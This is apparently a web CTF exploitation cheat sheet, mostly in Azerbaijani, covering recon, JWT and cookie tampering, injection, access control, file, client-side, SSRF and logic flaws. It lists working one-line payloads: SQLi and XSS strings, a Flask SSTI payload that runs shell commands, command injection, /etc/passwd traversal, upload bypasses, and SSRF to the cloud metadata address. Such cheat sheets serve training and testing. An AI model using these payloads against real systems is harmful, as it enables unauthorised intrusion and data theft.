# 🧠 Web CTF Exploitation Guide

## 🔍 1. Recon və İlk Mərhələ

* `gobuster`, `dirsearch`, `feroxbuster` ilə gizli URL-ləri tap:

  * `robots.txt`, `.git`, `sitemap.xml`, `.env`, `backup.zip`
  * Subdomain brute-force: `sublist3r`, `assetfinder`, `ffuf`
* Texnologiya identifikasiyası: `whatweb`, `wappalyzer`, `curl -I`

---

## 🔐 2. Authentication və Cookie Hücumları

* Login brute-force: `hydra`, `ffuf`, `admin:admin`
* Zəif JWT:

  * `alg: none` bypass
  * `RS256` → `HS256` dəyişdirərək HMAC ilə signature bruteforce
  * Expired token hələ də işləyir?
* Cookie tampering:

  * `isAdmin=true`, `role=admin`, `uid=1` test et
  * Base64 encoded session: `echo value | base64 -d`
  * Cookie signature yoxlamırsa: `header.payload.` formasında test et
* Session hijacking:

  * Cookie reuse ilə başqa hesabı impersonate et
  * CSRF ilə session reuse

---

## 💉 3. Injection Vulnerabilities

* SQLi:

  * Manual payloadlar: `' OR 1=1 --`, `UNION SELECT null...`
  * `sqlmap` ilə avtomatik sına
* XSS (Stored, Reflected):

  * `<script>alert(1)</script>`
  * `"><img src=x onerror=alert(1)>`
* SSTI (Server-Side Template Injection):

  * Flask: `{{7*7}}`, `{{config}}`, `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`
* Command Injection: `;ls`, `| whoami`, file upload input-u ilə sına
* XML Injection / XXE: SSRF və local file read potensialı

---

## 🔄 4. Access Control Flaws

* IDOR:

  * `?id=1`, `?user_id=1`, `?file=invoice.pdf`
* Privilege escalation:

  * JWT və ya cookie-də `role` dəyişdirmə
  * Gizli admin panelləri: `/admin`, `/dashboard`, `/superuser`
* Forced browsing: İcazəsiz URL-ləri birbaşa açmaq

---

## 📂 5. Fayl əsaslı zəifliklər

* LFI:

  * `?page=../../etc/passwd`, `%2e%2e/` variantları
  * `data:text/plain,{{7*7}}` və ya null byte (`%00`) bypass
* File Upload bypass:

  * `image.php.jpg`, `shell.php%00.jpg`
  * Content-Type spoof: `image/jpeg`
* ZIP Slip: Malicious `.zip` faylı ilə serverə yazmaq
* Insecure Deserialization: Pickle/PHP object injection

---

## 🌐 6. Client-Side Flaws

* DOM-based XSS
* Open Redirect: `?redirect=https://evil.com`
* CSRF: Əgər `SameSite` yoxdur və token yoxlanmırsa
* Clickjacking: `X-Frame-Options` yoxdursa
* CORS: `Access-Control-Allow-Origin: *`

---

## 📡 7. SSRF (Server-Side Request Forgery)

* URL parametrləri: `url=`, `load=`, `img=`
* Payloadlar:

  * `http://127.0.0.1:80/`, `http://localhost/admin`
  * `http://169.254.169.254/latest/meta-data/`

---

## 🛠 8. Misconfiguration

* Açıq `phpinfo.php`, `.env`, `config.js`, `debug=True`
* Backup faylları: `index.php~`, `login.bak`

---

## ⏱ 9. Logic və Race Condition

* Shopping cart qiyməti dəyişdirmə
* Promo kodu 2 dəfə istifadə
* Paralel request ilə payment bypass

---

## 🧩 10. Flag Axtarışı və Son Testlər

* Gizli endpointlər: `/flag`, `/admin/export`, `/api/secret`
* JSON response-larda `"flag"`, `"token"`, `"key"`
* Custom header test: `X-Admin: true`, `X-Forwarded-For: 127.0.0.1`

---

